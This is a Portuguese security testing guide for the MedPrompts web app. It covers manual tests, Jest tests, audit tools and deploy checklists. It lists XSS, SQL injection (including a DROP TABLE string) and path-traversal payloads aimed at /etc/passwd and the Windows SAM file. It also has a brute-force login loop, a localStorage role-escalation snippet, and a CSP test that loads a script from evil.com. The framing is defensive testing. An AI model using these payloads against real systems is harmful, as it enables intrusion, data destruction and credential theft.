# 🧪 Security Testing Guide - MedPrompts

**Guia Completo de Testes de Segurança**

---

## 📋 Índice

1. [Testes Manuais](#testes-manuais)
2. [Testes Automatizados](#testes-automatizados)
3. [Ferramentas de Auditoria](#ferramentas-de-auditoria)
4. [Checklist de Testes](#checklist-de-testes)
5. [Interpretação de Resultados](#interpretação-de-resultados)

---

## 🔍 Testes Manuais

### 1. Teste de XSS (Cross-Site Scripting)

**Objetivo:** Verificar se aplicação sanitiza inputs corretamente.

**Payloads de Teste:**

```html
<!-- 1. Basic Script Tag -->
<script>alert('XSS')</script>

<!-- 2. IMG Onerror -->
<img src=x onerror=alert('XSS')>

<!-- 3. SVG Onload -->
<svg onload=alert('XSS')>

<!-- 4. Body Onload -->
<body onload=alert('XSS')>

<!-- 5. Iframe Src -->
<iframe src=javascript:alert('XSS')>

<!-- 6. Link Href -->
<a href="javascript:alert('XSS')">Click</a>

<!-- 7. Input Autofocus -->
<input autofocus onfocus=alert('XSS')>

<!-- 8. Div Style -->
<div style="background:url(javascript:alert('XSS'))">

<!-- 9. Meta Refresh -->
<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">

<!-- 10. Encoded -->
%3Cscript%3Ealert('XSS')%3C/script%3E
```

**Onde Testar:**
- ✅ Campos de formulário (nome, email, etc)
- ✅ Campos de busca
- ✅ URL parameters
- ✅ Comentários/posts
- ✅ Bio/descrição de perfil

**Resultado Esperado:**
- ❌ Script NÃO deve executar
- ✅ Input deve ser sanitizado
- ✅ SafeHtml/SafeInput devem bloquear
- ✅ Console deve mostrar warning de XSS detectado

---

### 2. Teste de SQL Injection

**Objetivo:** Verificar detecção de tentativas de SQL injection.

**Payloads de Teste:**

```sql
-- 1. OR 1=1
admin' OR '1'='1
' OR '1'='1' --
admin'--

-- 2. UNION
' UNION SELECT NULL--
' UNION SELECT * FROM users--

-- 3. Stacked Queries
'; DROP TABLE users; --
'; DELETE FROM users WHERE '1'='1

-- 4. Time-Based
'; WAITFOR DELAY '00:00:05'--

-- 5. Boolean-Based
' AND 1=1--
' AND 1=2--
```

**Onde Testar:**
- ✅ Campo de login (email/username)
- ✅ Campo de busca
- ✅ Filtros

**Resultado Esperado:**
- ✅ Tentativa deve ser detectada
- ✅ Console deve mostrar warning
- ✅ Input deve ser sanitizado/escapado
- ❌ Query NÃO deve ser executada

**Nota:** Frontend não executa SQL, mas deve detectar e logar tentativas.

---

### 3. Teste de Path Traversal

**Objetivo:** Verificar detecção de tentativas de acesso a arquivos.

**Payloads de Teste:**

```
../../../etc/passwd
..\..\..\..\windows\system32\config\sam
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
```

**Resultado Esperado:**
- ✅ Tentativa deve ser detectada
- ✅ Console deve mostrar warning
- ❌ Acesso NÃO deve ser permitido

---

### 4. Teste de Autenticação

#### 4.1 Login com Credenciais Inválidas

```javascript
// Teste no DevTools Console
async function testBruteForce() {
  for (let i = 0; i < 10; i++) {
    try {
      await authService.login({
        email: 'test@test.com',
        password: 'wrongpass' + i
      });
    } catch (error) {
      console.log(`Tentativa ${i + 1}:`, error.message);
    }
  }
}
testBruteForce();
```

**Resultado Esperado:**
- ✅ Bloqueado após 5 tentativas
- ✅ Mensagem: "Muitas tentativas. Tente em X minutos"
- ✅ Rate limit ativo

#### 4.2 Token Expirado

```javascript
// 1. Faça login normalmente
const { accessToken } = await authService.login({...});

// 2. Espere 15+ minutos (ou modifique manualmente)
localStorage.setItem('medprompts_access_token', 'expired_token');

// 3. Tente acessar rota protegida
// Esperado: Redirecionado para login
```

---

### 5. Teste de RBAC (Autorização)

#### 5.1 Acessar Rota Admin como USER

```javascript
// 1. Login como USER
await authService.login({ email: 'user@test.com', ... });

// 2. Tente acessar /admin ou funcionalidade ADMIN
// Esperado: 403 Forbidden ou redirecionamento
```

#### 5.2 Bypass de RoleGuard

```javascript
// DevTools Console
// Tente modificar role manualmente
const user = JSON.parse(localStorage.getItem('medprompts_current_user'));
user.role = 'ADMIN';
localStorage.setItem('medprompts_current_user', JSON.stringify(user));

// Recarregue página e tente acessar rota admin
// Esperado: Backend deve validar e negar (se implementado)
// Frontend: Pode permitir visualmente mas não tem acesso real a dados
```

---

### 6. Teste de CSP (Content Security Policy)

#### 6.1 Eval() Bloqueado

```javascript
// DevTools Console
eval('alert("test")');
// Esperado: CSP error
```

#### 6.2 Inline Script Bloqueado

```javascript
// Tente injetar via DevTools Elements
const script = document.createElement('script');
script.innerHTML = 'alert("test")';
document.body.appendChild(script);
// Esperado: CSP bloqueia
```

#### 6.3 External Script Não-Autorizado

```javascript
const script = document.createElement('script');
script.src = 'https://evil.com/malicious.js';
document.body.appendChild(script);
// Esperado: CSP bloqueia
```

---

### 7. Teste de Rate Limiting

```javascript
// DevTools Console
async function testRateLimit() {
  const { checkLimit } = useRateLimit();

  // Tente múltiplas buscas rápidas
  for (let i = 0; i < 35; i++) {
    const result = checkLimit('search');
    console.log(`Tentativa ${i + 1}:`, result);

    if (!result.allowed) {
      console.log('⛔ BLOQUEADO!', result.error);
      break;
    }
  }
}
```

**Resultado Esperado:**
- ✅ Bloqueado após 30 tentativas (search)
- ✅ Mensagem de retry-after

---

## 🤖 Testes Automatizados

### 1. Jest + React Testing Library

```typescript
// __tests__/security/xss.test.ts
import { render, screen } from '@testing-library/react';
import { SafeHtml } from '@/components/common/SafeHtml';

describe('XSS Protection', () => {
  it('should sanitize malicious script', () => {
    const malicious = '<script>alert("XSS")</script>';
    render(<SafeHtml content={malicious} mode="html" />);

    // Script tag não deve estar no DOM
    expect(screen.queryByText('alert("XSS")')).not.toBeInTheDocument();
  });

  it('should allow safe HTML', () => {
    const safe = '<p>Hello <strong>World</strong></p>';
    render(<SafeHtml content={safe} mode="html" />);

    expect(screen.getByText('World')).toBeInTheDocument();
  });
});
```

```typescript
// __tests__/security/rate-limit.test.ts
import { rateLimitService } from '@/services/rate-limit.service';

describe('Rate Limiting', () => {
  beforeEach(() => {
    rateLimitService.clearAll();
  });

  it('should block after max attempts', () => {
    const identifier = 'test-user';

    // 5 tentativas devem ser permitidas
    for (let i = 0; i < 5; i++) {
      const result = rateLimitService.checkLimit(identifier, 'login');
      expect(result.allowed).toBe(true);
    }

    // 6ª tentativa deve ser bloqueada
    const blocked = rateLimitService.checkLimit(identifier, 'login');
    expect(blocked.allowed).toBe(false);
    expect(blocked.retryAfter).toBeGreaterThan(0);
  });
});
```

---

## 🛠️ Ferramentas de Auditoria

### 1. npm audit

```bash
# Verifica vulnerabilidades nas dependências
npm audit

# Tenta corrigir automaticamente
npm audit fix

# Relatório detalhado
npm audit --json > audit-report.json
```

**Interpretação:**
```
found 0 vulnerabilities    ✅ Ótimo!
found 2 vulnerabilities    ⚠️ Revisar
found 5 high severity      ❌ Urgente!
```

---

### 2. OWASP ZAP (Zed Attack Proxy)

```bash
# Docker
docker pull owasp/zap2docker-stable

# Baseline scan
docker run -t owasp/zap2docker-stable zap-baseline.py \
  -t https://seu-site.com

# Full scan
docker run -t owasp/zap2docker-stable zap-full-scan.py \
  -t https://seu-site.com
```

**O que ZAP testa:**
- XSS
- SQL Injection
- Path Traversal
- CSRF
- Security Headers
- SSL/TLS

---

### 3. Lighthouse (Chrome DevTools)

```bash
# Via CLI
npm install -g lighthouse
lighthouse https://seu-site.com --view

# Via DevTools
F12 > Lighthouse > Best Practices > Run
```

**Verifica:**
- HTTPS usage
- Secure cookies
- CSP headers
- Mixed content
- Vulnerable libraries

---

### 4. SecurityHeaders.com

```
https://securityheaders.com/?q=https://seu-site.com&followRedirects=on
```

**Grade esperado:** A ou A+

**Verifica:**
- X-Frame-Options
- X-Content-Type-Options
- X-XSS-Protection
- Referrer-Policy
- Permissions-Policy
- Strict-Transport-Security
- Content-Security-Policy

---

### 5. Mozilla Observatory

```
https://observatory.mozilla.org/analyze/seu-site.com
```

**Score esperado:** 90+

---

## ✅ Checklist de Testes

### Antes de Deploy

- [ ] `npm audit` - 0 vulnerabilidades high/critical
- [ ] Todos os testes passando
- [ ] HTTPS configurado
- [ ] Security headers verificados (SecurityHeaders.com)
- [ ] CSP testado e funcionando
- [ ] Rate limiting testado
- [ ] XSS payloads bloqueados
- [ ] RBAC funcionando corretamente
- [ ] .env.example atualizado
- [ ] .env NÃO commitado
- [ ] Documentação atualizada

### Após Deploy

- [ ] Lighthouse audit (score 90+)
- [ ] SecurityHeaders.com (grade A/A+)
- [ ] Mozilla Observatory (score 90+)
- [ ] OWASP ZAP scan
- [ ] Login/logout funcionando
- [ ] Rate limiting ativo
- [ ] CSP sem erros no console
- [ ] Certificado SSL válido
- [ ] Redirects HTTP → HTTPS

---

## 📊 Interpretação de Resultados

### npm audit

```json
{
  "vulnerabilities": {
    "info": 0,      // ℹ️ Informativo (OK)
    "low": 2,       // ⚠️ Baixo (monitorar)
    "moderate": 0,  // ⚠️ Moderado (corrigir)
    "high": 0,      // ❌ Alto (urgente!)
    "critical": 0   // 🚨 Crítico (IMEDIATO!)
  }
}
```

**Ação recomendada:**
- `critical/high`: Corrigir imediatamente
- `moderate`: Corrigir antes de deploy
- `low`: Monitorar e corrigir quando possível
- `info`: Apenas informativo

---

### SecurityHeaders.com

**Grades:**
- `A+` 🏆 - Excelente!
- `A` ✅ - Muito bom
- `B` ⚠️ - Bom, mas pode melhorar
- `C` ⚠️ - Adequado, requer melhorias
- `D` ❌ - Inadequado
- `F` 🚨 - Reprovado

**Headers Críticos:**
- `Content-Security-Policy` - Obrigatório
- `X-Frame-Options` - Obrigatório
- `X-Content-Type-Options` - Obrigatório
- `Strict-Transport-Security` - Obrigatório em produção

---

### Lighthouse Security

**Score:**
- `90-100` ✅ - Excelente
- `80-89` ⚠️ - Bom
- `70-79` ⚠️ - Adequado
- `<70` ❌ - Insuficiente

---

## 🚨 Red Flags (Sinais de Alerta)

### Crítico (Ação Imediata)

1. ❌ Senhas em plaintext ou Base64
2. ❌ Secrets no código
3. ❌ npm audit: critical vulnerabilities
4. ❌ Sem HTTPS em produção
5. ❌ XSS funcionando
6. ❌ SQL injection funcionando

### Alto (Corrigir Urgente)

1. ⚠️ npm audit: high vulnerabilities
2. ⚠️ Sem CSP
3. ⚠️ Sem rate limiting
4. ⚠️ Sem RBAC
5. ⚠️ SecurityHeaders.com: Grade D/F

### Médio (Corrigir Antes de Deploy)

1. ⚠️ npm audit: moderate vulnerabilities
2. ⚠️ SecurityHeaders.com: Grade C
3. ⚠️ Lighthouse: Score < 80
4. ⚠️ Sem sanitização de inputs

---

## 📞 Reportar Vulnerabilidade

Se encontrar vulnerabilidade CRÍTICA:

1. **NÃO** poste publicamente
2. Email: security@medprompts.com
3. Inclua:
   - Steps to reproduce
   - Impacto
   - Sugestão de fix

---

**🔒 Teste regularmente para manter segurança!**

*Recomendado: Testes semanais em dev, antes de cada deploy em prod*
